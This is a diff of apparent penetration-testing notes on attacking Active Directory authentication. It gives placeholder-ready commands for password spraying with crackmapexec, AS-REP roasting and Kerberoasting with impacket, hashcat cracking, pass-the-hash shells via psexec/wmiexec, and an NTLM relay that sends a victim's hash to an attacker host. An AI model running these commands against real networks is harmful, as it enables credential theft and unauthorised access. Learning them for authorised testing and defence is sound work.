@@ -1,34 +1,39 @@
-# Impacket 
+# Attacking Authentication
 
-Note: This doc should be placed in an eventual AD folder, once I get that far.
-## Install
+## Password spray
 
-install impacket with:
-`pipenv install impacket`
-this will create a virtualenv in `/home/${local_user}/.local/share/virtualenvs/${VENV_NAME}`
-you can then:
+
+Password spray attack with crackmapexec.
+Note that crackmapexec doesn't look at the policy for locking users
+
 ```
-export IMPACKET_SCRIPTS=$(pipenv --venv)/bin
+crackmapexec smb $RHOST -u ${USERS_FILE} -p '${PASSWORD}' -d ${DOMAIN} --continue-on-success
 ```
-Now, you can run impacket scripts with:
+Available protocols are: `ssh,mssql,winrm,smb,ldap,rdp,ftp`.
+
+## Impacket
+
+### AS-REP roasting
+
 ```
-python3  ${IMPACKET_SCRIPTS}/${script} ...
+impacket-GetNPUsers -dc-ip ${DC_IP} -request -outputfile asrep-result.txt ${DOMAIN}/${OWNED_USER}
 ```
 
-## Kerberoasting
+### Kerberoasting
 
+This is good for high-privilege service accounts.
 check for SPN accounts:
 ```
-python3 ${IMPACKET_SCRIPTS}/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PASSWORD} 
+impacket-GetUserSPNs -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PASSWORD} 
 
 ```
-Now, we can request the TGS for the found user:
+Now, we can request the TGS for the found SPN:
 
 ```
-python3 $IMPACKET_SCRIPTS/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PW} -request-user ${SPN_ACCOUNT} -outputfile tgs.txt 
-
-
+impacket-GetUserSPNs -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PW} -request-user ${SPN_ACCOUNT} -outputfile tgs.txt 
 ```
+Note the `$SPN_ACCOUNT` is the account Name, not the ServicePrincipalName.
+
 
 Now, you can crack the password in the tgs file:
 
@@ -36,8 +41,7 @@ Now, you can crack the password in the tgs file:
 hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
 ```
 
-
-## Pass Admin hash psexec
+### Pass Admin hash psexec
 
 Assuming you've found an NTLM admin hash, you might be able to get a reverse shell onto another machine with `impacket-psexec`:
 
@@ -49,7 +53,7 @@ Format is `${LM_HASH}:${NT_HASH}` - when using the NTLM hash, just put `32 * 0` 
 a similar command is `impacket-wmiexec`, which gets us a shell as Administrator, rather than the SYSTEM.
 
 
-## Relay hash with impacket-ntlmrelayx
+### Relay hash with impacket-ntlmrelayx
 
 You can relay SMB requests between SRV1 and SRV2 by doing the following:
 
@@ -58,5 +62,4 @@ You can relay SMB requests between SRV1 and SRV2 by doing the following:
 * From SRV1 do `dir \\$ATTACKER_IP\thiswillgetdenied`.
 The SMB request with the NTLMv2 Hash of the user on SRV1 will get relayed to SRV2.
 Target system needs to have UAC remote restrictions disabled, and the user on SRV1 needs to have access to SRV2 for this to work.
-
 
